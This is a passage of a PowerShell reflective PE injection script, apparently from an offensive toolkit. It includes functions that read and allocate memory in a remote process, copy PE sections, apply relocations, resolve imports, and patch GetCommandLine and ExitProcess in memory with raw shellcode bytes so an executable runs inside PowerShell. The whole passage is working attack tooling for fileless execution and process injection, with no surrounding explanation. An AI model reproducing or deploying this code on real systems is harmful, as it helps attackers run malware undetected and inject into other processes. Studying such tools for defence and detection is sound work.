		    #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		    if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		    {
			    Throw "Call to ReadProcessMemory failed"
		    }
		    [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		    return $ProcAddress
	    }


	    Function Copy-Sections
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			    #Address to copy the section to
			    [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			    #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			    #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			    #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			    #    so truncate SizeOfRawData to VirtualSize
			    $SizeOfRawData = $SectionHeader.SizeOfRawData

			    if ($SectionHeader.PointerToRawData -eq 0)
			    {
				    $SizeOfRawData = 0
			    }
			
			    if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			    {
				    $SizeOfRawData = $SectionHeader.VirtualSize
			    }
			
			    if ($SizeOfRawData -gt 0)
			    {
				    Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			    }
		
			    #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			    if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			    {
				    $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				    [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				    Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				    $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			    }
		    }
	    }


	    Function Update-MemoryAddresses
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $OriginalImageBase,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    [Int64]$BaseDifference = 0
		    $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		    [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		    #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		    if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				    -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		    {
			    return
		    }


		    elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		    {
			    $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			    $AddDifference = $false
		    }
		    elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		    {
			    $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		    }
		
		    #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		    [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		    while($true)
		    {
			    #If SizeOfBlock == 0, we are done
			    $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			    if ($BaseRelocationTable.SizeOfBlock -eq 0)
			    {
				    break
			    }

			    [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			    $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			    #Loop through each relocation
			    for($i = 0; $i -lt $NumRelocations; $i++)
			    {
				    #Get info for this relocation
				    $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				    [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				    #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				    [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				    [UInt16]$RelocType = $RelocationInfo -band 0xF000
				    for ($j = 0; $j -lt 12; $j++)
				    {
					    $RelocType = [Math]::Floor($RelocType / 2)
				    }

				    #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				    #This appears to be true for EXE's as well.
				    #	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				    if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						    -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				    {			
					    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
					    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					    if ($AddDifference -eq $true)
					    {
						    [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					    }
					    else
					    {
						    [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					    }				

					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				    }
				    elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				    {
					    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				    }
			    }
			
			    $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		    }
	    }


	    Function Import-DllImports
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 4, Mandatory = $false)]
		    [IntPtr]
		    $RemoteProcHandle
		    )
		
		    $RemoteLoading = $false
		    if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		    {
			    $RemoteLoading = $true
		    }
		
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		    {
			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			    while ($true)
			    {
				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				    #If the structure is null, it signals that this is the end of the array
				    if ($ImportDescriptor.Characteristics -eq 0 `
						    -and $ImportDescriptor.FirstThunk -eq 0 `
						    -and $ImportDescriptor.ForwarderChain -eq 0 `
						    -and $ImportDescriptor.Name -eq 0 `
						    -and $ImportDescriptor.TimeDateStamp -eq 0)
				    {
					    Write-Verbose "Done importing DLL imports"
					    break
				    }

				    $ImportDllHandle = [IntPtr]::Zero
				    $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				    if ($RemoteLoading -eq $true)
				    {
					    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				    }
				    else
				    {
					    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				    }

				    if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				    {
					    throw "Error importing DLL, DLLName: $ImportDllPath"
				    }
				
				    #Get the first thunk, then loop through all of them
				    [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				    while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				    {
					    $ProcedureName = ''
					    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					    #	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					    #	and doing the comparison, just see if it is less than 0
					    [IntPtr]$NewThunkRef = [IntPtr]::Zero
					    if([Int64]$OriginalThunkRefVal -lt 0)
					    {
						    $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					    }
					    else
					    {
						    [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						    $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						    $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					    }
					
					    if ($RemoteLoading -eq $true)
					    {
						    [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					    }
					    else
					    {
						    [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					    }
					
					    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					    {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					    }

					    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				    }
				
				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			    }
		    }
	    }

	    Function Get-VirtualProtectValue
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [UInt32]
		    $SectionCharacteristics
		    )
		
		    $ProtectionFlag = 0x0
		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		    {
			    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				    }
			    }
			    else
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				    }
			    }
		    }
		    else
		    {
			    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_READONLY
				    }
			    }
			    else
			    {
				    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				    }
				    else
				    {
					    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				    }
			    }
		    }
		
		    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		    {
			    $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		    }
		
		    return $ProtectionFlag
	    }

	    Function Update-MemoryProtectionFlags
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			    [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			    [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			    [UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			    [UInt32]$OldProtectFlag = 0
			    Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			    $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Unable to change memory protection"
			    }
		    }
	    }
	
	    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	    Function Update-ExeFunctions
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [String]
		    $ExeArguments,
		
		    [Parameter(Position = 4, Mandatory = $true)]
		    [IntPtr]
		    $ExeDoneBytePtr
		    )
		
		    #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		    $ReturnArray = @() 
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		    [UInt32]$OldProtectFlag = 0
		
		    [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		    if ($Kernel32Handle -eq [IntPtr]::Zero)
		    {
			    throw "Kernel32 handle null"
		    }
		
		    [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		    if ($KernelBaseHandle -eq [IntPtr]::Zero)
		    {
			    throw "KernelBase handle null"
		    }

		    #################################################
		    #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		    #	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		    $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		    $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		    [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		    [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		    if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		    {
			    throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		    }

		    #Prepare the shellcode
		    [Byte[]]$Shellcode1 = @()
		    if ($PtrSize -eq 8)
		    {
			    $Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		    }
		    $Shellcode1 += 0xb8
		
		    [Byte[]]$Shellcode2 = @(0xc3)
		    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		    #Make copy of GetCommandLineA and GetCommandLineW
		    $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		    $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		    $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		    $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		    $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		    $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		    #Overwrite GetCommandLineA
		    [UInt32]$OldProtectFlag = 0
		    $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		    if ($Success = $false)
		    {
			    throw "Call to VirtualProtect failed"
		    }
		
		    $GetCommandLineAAddrTemp = $GetCommandLineAAddr
		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		    $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		    #Overwrite GetCommandLineW
		    [UInt32]$OldProtectFlag = 0
		    $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		    if ($Success = $false)
		    {
			    throw "Call to VirtualProtect failed"
		    }
		
		    $GetCommandLineWAddrTemp = $GetCommandLineWAddr
		    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		    $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		    $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    #################################################
		
		
		    #################################################
		    #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		    #	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		    #	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		    #	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		    $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			    , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		    foreach ($Dll in $DllList)
		    {
			    [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			    if ($DllHandle -ne [IntPtr]::Zero)
			    {
				    [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				    [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				    if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				    {
					    "Error, couldn't find _wcmdln or _acmdln"
				    }
				
				    $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				    $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				    #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				    $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				    $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				    $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				    $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				    $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				    $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				    $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				    if ($Success = $false)
				    {
					    throw "Call to VirtualProtect failed"
				    }
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				    $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				    $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				    if ($Success = $false)
				    {
					    throw "Call to VirtualProtect failed"
				    }
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				    $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			    }
		    }
		    #################################################
		
		
		    #################################################
		    #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		    $ReturnArray = @()
		    $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		    #CorExitProcess (compiled in to visual studio c++)
		    [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		    if ($MscoreeHandle -eq [IntPtr]::Zero)
		    {
			    throw "mscoree handle null"
		    }
		    [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		    if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		    {
			    Throw "CorExitProcess address not found"
		    }
		    $ExitFunctions += $CorExitProcessAddr
		
		    #ExitProcess (what non-managed programs use)
		    [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		    if ($ExitProcessAddr -eq [IntPtr]::Zero)
		    {
			    Throw "ExitProcess address not found"
		    }
		    $ExitFunctions += $ExitProcessAddr
		
		    [UInt32]$OldProtectFlag = 0
		    foreach ($ProcExitFunctionAddr in $ExitFunctions)
		    {
			    $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			    #The following is the shellcode (Shellcode: ExitThread.asm):
			    #32bit shellcode
			    [Byte[]]$Shellcode1 = @(0xbb)
			    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			    #64bit shellcode (Shellcode: ExitThread.asm)
			    if ($PtrSize -eq 8)
			    {
				    [Byte[]]$Shellcode1 = @(0x48, 0xbb)
				    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			    }
			    [Byte[]]$Shellcode3 = @(0xff, 0xd3)
			    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			    [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			    if ($ExitThreadAddr -eq [IntPtr]::Zero)
			    {
				    Throw "ExitThread address not found"
			    }

			    $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Call to VirtualProtect failed"
			    }
			
			    #Make copy of original ExitProcess bytes
			    $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			    $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			    $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			    #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
